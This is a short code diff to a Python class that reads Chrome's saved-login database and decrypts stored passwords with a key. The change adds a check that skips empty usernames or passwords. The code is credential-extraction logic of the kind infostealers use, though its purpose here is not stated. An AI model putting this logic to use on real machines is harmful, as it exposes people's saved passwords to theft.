@@ -57,8 +57,12 @@ class CookieRepository_Chrome:
             cursor.execute("SELECT origin_url, username_value, password_value, signon_realm, date_created, date_last_used, date_password_modified FROM logins")
             for origin_url, username_value, password_value, signon_realm, date_created, date_last_used, date_password_modified in cursor.fetchall():
                 try:
-                    password_value = desecriptar_dato(password_value, llave)
-                    contrasenias.append(ChromeUser(origin_url, username_value, password_value, signon_realm, date_created, date_last_used, date_password_modified))
+                    if password_value and username_value:
+                        password_value = desecriptar_dato(password_value, llave)
+                        contrasenias.append(ChromeUser(origin_url, username_value, password_value, signon_realm, date_created, date_last_used, date_password_modified))
+                    else:
+                        continue
+
                 except Exception as e:
                     print(f"Error al desencriptar la contraseña: {e}")
         return contrasenias
